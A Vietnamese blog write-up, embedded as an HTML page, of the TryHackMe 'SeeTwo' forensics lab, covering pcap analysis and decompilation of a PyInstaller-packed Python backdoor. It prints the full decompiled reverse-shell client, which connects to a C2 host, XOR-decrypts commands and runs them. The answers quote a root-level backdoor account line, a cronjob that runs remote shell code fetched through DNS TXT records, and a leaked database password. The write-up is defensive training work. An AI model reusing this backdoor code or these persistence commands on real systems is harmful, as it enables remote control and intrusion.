@@ -1,0 +1,120 @@
+<!doctype html><html lang=en dir=ltr><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>SeeTwo Tryhackme | NmToan Blog</title><meta name=generator content="Hugo Eureka 0.9.3"><link rel=stylesheet href=https://nmtshark.github.io/css/eureka.min.d69f9ba11e39460e0c72f6952b8694b04ebcbd76fd33468ac1338291c2c709c503834d39ba9eb6427170f24918d3a11e.css><script defer src=https://nmtshark.github.io/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js></script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto+Serif+SC:wght@400;600;700&amp;display=swap" as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js crossorigin></script><script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js crossorigin></script><link rel=stylesheet href=https://nmtshark.github.io/css/highlightjs.min.a02d1b7bfa7653e4d7684d8787a2acd5fe733bb02bc51100ed283b052fb81ac1bd98abbcd0af6ad005b66b8f284a3ab2.css media=print onload='this.media="all",this.onload=null'><script defer type=text/javascript src=https://nmtshark.github.io/js/fontawesome.min.e2f6d6879180aca6d7a208caf6042b48205fe0e2b24323ecb4246f857cef11589c39e283fb5a5e45945791ce4c3b7595.js></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js integrity=sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0 crossorigin></script><link rel=icon type=image/png sizes=32x32 href=https://nmtshark.github.io/images/icon_hu_cea985e214c74f98.png><link rel=apple-touch-icon sizes=180x180 href=https://nmtshark.github.io/images/icon_hu_b4231e3a3e195a.png><meta name=description content='"Write-up challenge SeeTwo từ TryHackMe về phân tích lưu lượng mạng và dịch ngược mã độc Python."
+'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://nmtshark.github.io/posts/"},{"@type":"ListItem","position":2,"name":"SeeTwo Tryhackme","item":"https://nmtshark.github.io/posts/seetwo-tryhackme/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://nmtshark.github.io/posts/seetwo-tryhackme/"},"headline":"SeeTwo Tryhackme | NmToan Blog","datePublished":"2025-12-29T04:59:04+00:00","dateModified":"2025-12-29T13:39:20+00:00","wordCount":1499,"publisher":{"@type":"Person","name":"WANG Chucheng","logo":{"@type":"ImageObject","url":"https://nmtshark.github.io/images/icon.png"}},"description":"\u0022Write-up challenge SeeTwo từ TryHackMe về phân tích lưu lượng mạng và dịch ngược mã độc Python.\u0022\n"}</script><meta property="og:title" content="SeeTwo Tryhackme | NmToan Blog"><meta property="og:type" content="article"><meta property="og:image" content="https://nmtshark.github.io/images/icon.png"><meta property="og:url" content="https://nmtshark.github.io/posts/seetwo-tryhackme/"><meta property="og:description" content='"Write-up challenge SeeTwo từ TryHackMe về phân tích lưu lượng mạng và dịch ngược mã độc Python."
+'><meta property="og:locale" content="en"><meta property="og:site_name" content="NmToan Blog"><meta property="article:published_time" content="2025-12-29T04:59:04+00:00"><meta property="article:modified_time" content="2025-12-29T13:39:20+00:00"><meta property="article:section" content="posts"><meta property="article:tag" content="Forensics"><meta property="article:tag" content="TryHackMe"><meta property="og:see_also" content="https://nmtshark.github.io/posts/helpmeput/"><meta property="og:see_also" content="https://nmtshark.github.io/posts/frndput/"><meta property="og:see_also" content="https://nmtshark.github.io/posts/putwow/"><meta property="og:see_also" content="https://nmtshark.github.io/posts/heroctf-2025-forensics-2/"><meta property="og:see_also" content="https://nmtshark.github.io/posts/vcspassport_blue_team_ctf_gimme_your_point/"><body class="flex min-h-screen flex-col"><header class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"><div class="mx-auto w-full max-w-screen-xl"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=="Auto"||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName("html")[0].classList.add("dark")</script><nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0"><a href=/ class="me-6 text-primary-text text-xl font-bold">NmToan Blog</a>
+<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+<i class="fas fa-bars"></i></button><div id=target class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20"><div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0"><a href=/#about class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">About</a>
+<a href=/posts/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 selected-menu-item me-4">Posts</a>
+<a href=/docs/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">Docs</a></div><div class=flex><div class="relative pt-4 md:pt-0"><div class="cursor-pointer hover:text-eureka" id=lightDarkMode><i class="fas fa-adjust"></i></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open></div><div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions><span class="px-4 py-1 hover:text-eureka" name=Light>Light</span>
+<span class="px-4 py-1 hover:text-eureka" name=Dark>Dark</span>
+<span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span></div></div></div></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile></div></nav><script>let element=document.getElementById("lightDarkMode");storageColorScheme==null||storageColorScheme=="Auto"?document.addEventListener("DOMContentLoaded",()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","sun"),element.firstElementChild.classList.add("fa-sun")):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","moon"),element.firstElementChild.classList.add("fa-moon")),document.addEventListener("DOMContentLoaded",()=>{getcolorscheme(),switchBurger()})</script></div></header><main class="grow pt-16"><div class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8"><div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12"><div class="lg:col-start-2 bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"><article class=prose><h1 class=mb-4>SeeTwo Tryhackme</h1><div class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"><div class="me-6 my-2"><i class="fas fa-calendar me-1"></i>
+<span>2025-12-29</span></div><div class="me-6 my-2"><i class="fas fa-clock me-1"></i>
+<span>8 min read</span></div></div><blockquote><p><strong>Chủ đề:</strong> Phân tích lưu lượng mạng và Dịch ngược Mã độc Python (C2 Traffic Decryption)
+<strong>Mục tiêu:</strong> Phân tích file capture.pcap, xác định hoạt động đáng ngờ, dịch ngược mã độc và giải mã nội dung giao tiếp giữa nạn nhân (victim) và máy chủ điều khiển (C2 Server)</p></blockquote><hr><h2 id=mô-tả-thử-thách>Mô tả thử thách</h2><blockquote><p>You are tasked with looking at some suspicious network activity by your digital forensics team.
+The server has been taken out of production while you analyze the suspicious behavior.</p></blockquote><h2 id=phân-tích>Phân tích</h2><p>Sau khi nhận file pcap, tôi bắt đầu phân tích lưu lượng mạng. Bằng việc lọc các gói tin TCP, tôi phát hiện những đoạn dữ liệu mã hóa đáng ngờ và một tập tin đã được truyền tải thông qua giao thức HTTP.</p><p>Stream 2:</p><pre><code>GET /base64_client HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.0.2.64
+Connection: Keep-Alive
+
+
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.11.4
+Date: Fri, 27 Oct 2023 03:06:00 GMT
+Content-type: application/octet-stream
+Content-Length: 16181879
+Last-Modified: Fri, 27 Oct 2023 03:05:03 GMT
+
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAdSVAAAAAAABAAAAAAAAAACjBtgAAAAAAAAAAAEAAOAAL
+AEAAHAAbAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAaA.....
+</code></pre><p>Tiếp tục tăng số stream tôi phát hiện thấy một lượng lớn đoạn mã hóa có khả năng là base64</p><p>Stream 3:</p><pre><code>iVBORw0KGgoAAAANSUhEUgAAAU4AAAGFCAYAAACSfBoeAAAIUklEQVR42u3dO64qSxBE0Z45JjNEYgaYzICPh4dTyo7MWiFtP8.......
+</code></pre><p>Stream 4:</p><pre><code>iVBORw0KGgoAAAANSUhEUgAAAVwAAAFcBAMAAAB2OBsfAAAAKlBMVEXu7u7///8BAAD1Qzaenp7+TD40IyKvr6/Yz85fX1/pMiSZKSGIiIj5gnm5oY/.....
+</code></pre><p>Tiếp theo tôi lọc filter giao thức HTTP để phân tích các gói tin HTTP và nhận được kết quả như sau:</p><p><img src=src/assets/images/http.png alt="Các gói tin HTTP"></p><p>Qua việc phân tích các gói tin HTTP và trước đó, tôi phát hiện có 1 file được truyền tải và tôi đã tải file này về để phân tích tiếp bằng cách sử dụng</p><pre><code>file --&gt; export objects --&gt; save all
+</code></pre><p>Sau khi tải về tôi được một file có tên là <code>base64_client</code>. Tôi sử dụng lệnh <code>file base64_client</code> để kiểm tra loại file và nhận được kết quả:</p><p><img src=src/assets/images/file.png alt="Loại file"></p><p>Sau đó tiến hành tôi sử dụng lệnh cat và nhận thấy đây là một file chứa một chuỗi văn bản khổng lồ có thể là đoạn mã hóa bằng base64:
+<img src=src/assets/images/cat.png alt="Nội dung file base64_client"></p><p>Tôi tiến hành giải mã đoạn base64 này bằng lệnh:</p><pre><code>base64 -d base64_client &gt; decoded_file
+</code></pre><p>Sau khi giải mã tôi nhận được một file có tên <code>decoded_file</code>. Tôi tiếp tục sử dụng lệnh <code>file decoded_file</code> để kiểm tra loại file và nhận được kết quả:</p><p><img src=src/assets/images/file_decoded.png alt="Loại file decoded_file"></p><p>Từ kết quả trên tôi nhận thấy đây là một file thực thi ELF 64-bit. Tôi sử dụng lệnh <code>strings decoded_file | less</code> để xem các chuỗi ký tự trong file và nhận được nhiều chuỗi đáng chú ý như:</p><p><img src=src/assets/images/strings.png alt="Chuỗi trong decoded_file">
+Phân tích từ các chuỗi trên tôi nhận thấy đây là một mã độc được viết bằng Python và đã được đóng gói thành file thực thi ELF bằng PyInstaller. Tôi quyết định sử dụng công cụ <code>pyinstxtractor</code> để giải nén file này.</p><pre><code>git clone https://github.com/extremecoders-re/pyinstxtractor
+cd pyinstxtractor
+python3 pyinstxtractor.py ../decoded_file
+</code></pre><p>Sau khi giải nén tôi nhận được một thư mục <code>decoded_file_extracted</code> chứa nhiều file và thư mục con.</p><p><img src=src/assets/images/ls.png alt="Toàn bộ file trong thư mục"></p><p>Tới bước này có thể chúng ta sẽ phân vân không biết nên phân tích file nào. Tuy nhiên, dựa vào kinh nghiệm của tôi khi bạn nhìn vào list các file có thể thấy một file có tên <code>client.pyc</code> rất nổi bật vì nó có tên giống với tên file trong URL ban đầu <code>base64_client</code>. Tôi quyết định phân tích file này trước.<br>Tôi sử dụng công cụ <code>uncompyle6</code> để dịch ngược file <code>client.pyc</code> về mã nguồn Python.</p><pre><code>python3 -m venv myenv
+source myenv/bin/activate
+pip install uncompyle6
+uncompyle6 -o . client.pyc
+</code></pre><p>Sau khi dịch ngược tôi nhận được file <code>client.py</code> chứa mã nguồn Python. Tôi mở file này và tiến hành phân tích mã nguồn.</p><pre><code class=language-python># uncompyle6 version 3.9.3
+# Python bytecode version base 3.8.0 (3413)
+# Decompiled from: Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0]
+# Embedded file name: client.py
+import socket, base64, subprocess, sys
+HOST = &quot;10.0.2.64&quot;
+PORT = 1337
+
+def xor_crypt(data, key):
+    key_length = len(key)
+    encrypted_data = []
+    for i, byte in enumerate(data):
+        encrypted_byte = byte ^ key[i % key_length]
+        encrypted_data.append(encrypted_byte)
+    else:
+        return bytes(encrypted_data)
+
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    while True:
+        received_data = s.recv(4096).decode(&quot;utf-8&quot;)
+        encoded_image, encoded_command = received_data.split(&quot;AAAAAAAAAA&quot;)
+        key = &quot;MySup3rXoRKeYForCommandandControl&quot;.encode(&quot;utf-8&quot;)
+        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode(&quot;utf-8&quot;)), key)
+        decrypted_command = decrypted_command.decode(&quot;utf-8&quot;)
+        result = subprocess.check_output(decrypted_command, shell=True).decode(&quot;utf-8&quot;)
+        encrypted_result = xor_crypt(result.encode(&quot;utf-8&quot;), key)
+        encrypted_result_base64 = base64.b64encode(encrypted_result).decode(&quot;utf-8&quot;)
+        separator = &quot;AAAAAAAAAA&quot;
+        send = encoded_image + separator + encrypted_result_base64
+        s.sendall(send.encode(&quot;utf-8&quot;))
+                                                                      
+</code></pre><p>Qua phân tích mã nguồn, có thể xác định đây là một mã độc dạng Backdoor, thiết lập kết nối Reverse Shell qua giao thức TCP để nhận lệnh từ máy chủ điều khiển (C2).</p><ol><li>Thông tin</li></ol><ul><li>C2 Server: Mã độc chủ động kết nối tới địa chỉ IP 10.0.2.64.</li><li>Port: Cổng dịch vụ là 1337.</li><li>Khóa giải mã (Key): Một khóa cứng (hardcoded key) được tìm thấy trong mã nguồn là: &ldquo;MySup3rXoRKeYForCommandandControl&rdquo;.</li></ul><ol start=2><li>Cơ chế Mã hóa và Làm rối</li></ol><ul><li>Để tránh bị phát hiện bởi các hệ thống giám sát mạng (IDS/IPS), mã độc không gửi lệnh dưới dạng văn bản rõ (plaintext) mà sử dụng thuật toán XOR kết hợp với Base64:</li><li>Thuật toán XOR: Sử dụng tính chất đối xứng của phép toán XOR (A ^ Key = B và B ^ Key = A) để dùng chung một hàm cho cả việc mã hóa và giải mã.</li><li>Cơ chế Key Cycling: Sử dụng kỹ thuật vòng lặp khóa (key[i % key_length]). Nếu dữ liệu dài hơn độ dài của khóa, khóa sẽ tự động lặp lại từ đầu để đảm bảo mọi byte dữ liệu đều được xử lý.</li></ul><ol start=3><li>Kỹ thuật Che giấu Giao tiếp
+Mã độc sử dụng kỹ thuật ngụy trang gói tin để đánh lừa các nhà phân tích:</li></ol><ul><li>Mỗi gói tin trao đổi luôn bao gồm hai phần, được ngăn cách bởi chuỗi ký tự đặc biệt: AAAAAAAAAA.</li><li>Phần đầu: Chứa dữ liệu rác hoặc mã Base64 của một file ảnh (nhằm giả mạo lưu lượng tải ảnh thông thường).</li><li>Phần sau: Chứa Payload (lệnh hoặc kết quả) đã được mã hóa.</li></ul><ol start=4><li>Quy trình Xử lý Dữ liệu
+Quá trình giao tiếp giữa máy nạn nhân và C2 diễn ra theo hai chiều như sau:</li></ol><blockquote><p>A. Chiều Nhận lệnh (Inbound):</p></blockquote><ul><li>Phân tách: Mã độc nhận gói tin và tách lấy phần payload nằm sau chuỗi phân cách AAAAAAAAAA.</li></ul><p>Giải mã:</p><ul><li><p>Base64 Decode: Chuyển chuỗi ký tự về định dạng nhị phân (binary).</p></li><li><p>XOR Decrypt: Kết hợp với khóa cứng để giải mã ra câu lệnh gốc.</p></li><li><p>Thực thi: Sử dụng hàm subprocess.check_output với tham số shell=True để chạy câu lệnh vừa giải mã trực tiếp trên hệ thống nạn nhân với quyền hạn hiện tại.</p></li></ul><blockquote><p>B. Chiều Gửi kết quả (Outbound): Ngược lại với quy trình nhận, kết quả sau khi thực thi lệnh sẽ được xử lý để gửi trả về C2:</p></blockquote><p>Mã hóa:</p><ul><li><p>XOR Encrypt: Mã hóa kết quả thực thi (dạng text) bằng thuật toán XOR.</p></li><li><p>Base64 Encode: Chuyển dữ liệu đã mã hóa sang dạng chuỗi Base64 để thuận tiện truyền tải.</p></li><li><p>Đóng gói (Re-packaging): Ghép chuỗi kết quả này vào sau dữ liệu ảnh giả mạo và chuỗi phân cách AAAAAAAAAA. Điều này giúp duy trì vỏ bọc ngụy trang nhất quán trong cả hai chiều giao tiếp.</p></li></ul><p>Sau khi phân tích kỹ mã nguồn, tôi đã nhờ AI tạo một script để giải mã chuỗi văn bản khổng lồ đã tìm thấy trong file pcap ban đầu. Dưới đây là script Python mà tôi đã sử dụng:</p><pre><code class=language-python>import base64
+import os
+
+INPUT_PATH = r&quot;D:\CTF\THM\evidence-1698376680956\dump.txt&quot;
+OUTPUT_PATH = INPUT_PATH.replace(&quot;dump.txt&quot;, &quot;communicate.txt&quot;)
+
+KEY = b&quot;MySup3rXoRKeYForCommandandControl&quot;
+SEPARATOR = &quot;AAAAAAAAAA&quot;
+
+def main():
+    success_count = 0
+    try:
+        with open(INPUT_PATH, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as infile, \
+             open(OUTPUT_PATH, &quot;w&quot;, encoding=&quot;utf-8&quot;) as outfile:
+            for line in infile:
+                line = line.strip()
+                if not line: continue
+                try:  
+                    if SEPARATOR in line:
+                        encoded_data = line.split(SEPARATOR)[1]
+                    else:
+                        continue 
+                    # 2. Base64 Decode
+                    decoded_data = base64.b64decode(encoded_data)
+                   
+                    # 3. XOR Decrypt
+                    decrypted = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(decoded_data))                   
+                    decrypted_text = decrypted.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
+                    outfile.write(decrypted_text + &quot;\n&quot;)
+                    success_count += 1
+                except (IndexError, base64.binascii.Error, ValueError):
+                    continue
+ 
+    except Exception as e:
+        print(f&quot;[-] Lỗi: {e}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre><p>Sau khi chạy script trên, tôi nhận được một file <code>communicate.txt</code> chứa các lệnh đã được giải mã. Tôi mở file này và tìm thấy nhiều lệnh hệ thống đã được thực thi trên máy nạn nhân, tới đây chúng ta đã có đủ dữ liệu để có thể trả lời các câu hỏi của challenge.</p><p><img src=src/assets/images/communicate.png alt="Nội dung file"></p><h2 id=kết-luận-và-trả-lời-câu-hỏi>Kết luận và Trả lời câu hỏi</h2><ol><li><strong>What is the first file that is read? Enter the full path of the file.</strong><ul><li>Đáp án: <code>/home/bella/.bash_history</code></li></ul></li><li><strong>What is the output of the file from question 1?</strong><ul><li>Đáp án: <code>mysql -u root -p'vb0xIkSGbcEKBEi'</code></li></ul></li><li><strong>What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.</strong><ul><li>Đáp án: <code>toor::0:0:root:/root:/bin/bash</code></li></ul></li><li><strong>What is the name of the backdoor executable?</strong><ul><li>Đáp án: <code>/usr/bin/passswd</code></li></ul></li><li><strong>What is the md5 hash value of the executable from question 4?</strong><ul><li>Đáp án: <code>23c415748ff840b296d0b93f98649dec</code></li></ul></li><li><strong>What was the first cronjob that was placed by the attacker?</strong><ul><li>Đáp án: <code>* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"</code></li></ul></li><li><strong>What is the flag?</strong><ul><li>Đáp án: <code>THM{See2sNev3rGetOld}</code></li></ul></li></ol></article><div class=my-4><a href=https://nmtshark.github.io/tags/forensics/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#Forensics</a>
+<a href=https://nmtshark.github.io/tags/tryhackme/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#TryHackMe</a></div><div class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"><div><span class="text-primary-text block font-bold">Previous</span>
+<a href=https://nmtshark.github.io/posts/frndput/ class=block>MY FRIEND ARTIST</a></div><div class="mt-4 md:mt-0 md:text-right"><span class="text-primary-text block font-bold">Next</span>
+<a href=https://nmtshark.github.io/posts/putwow/ class=block>WOW!</a></div></div></div><div class="lg:col-start-2 bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"><h3>See Also</h3><a href=https://nmtshark.github.io/posts/helpmeput/ class=no-underline>HELP ME</a><br><a href=https://nmtshark.github.io/posts/frndput/ class=no-underline>MY FRIEND ARTIST</a><br><a href=https://nmtshark.github.io/posts/putwow/ class=no-underline>WOW!</a><br><a href=https://nmtshark.github.io/posts/heroctf-2025-forensics-2/ class=no-underline>HeroCTF 2025 Forensics 2</a><br><a href=https://nmtshark.github.io/posts/vcspassport_blue_team_ctf_gimme_your_point/ class=no-underline>VCSPassport BlueTeam CTF Gimme_your_point!</a><br></div></div><script>document.addEventListener("DOMContentLoaded",()=>{hljs.highlightAll()})</script></div></div></main><footer class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b"><p class="text-sm text-tertiary-text">&copy; 2021 <a href=https://www.wangchucheng.com/>WANG Chucheng</a> and <a href=https://www.ruiqima.com/>MA Ruiqi</a>
+&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p></div></div></footer></body></html>
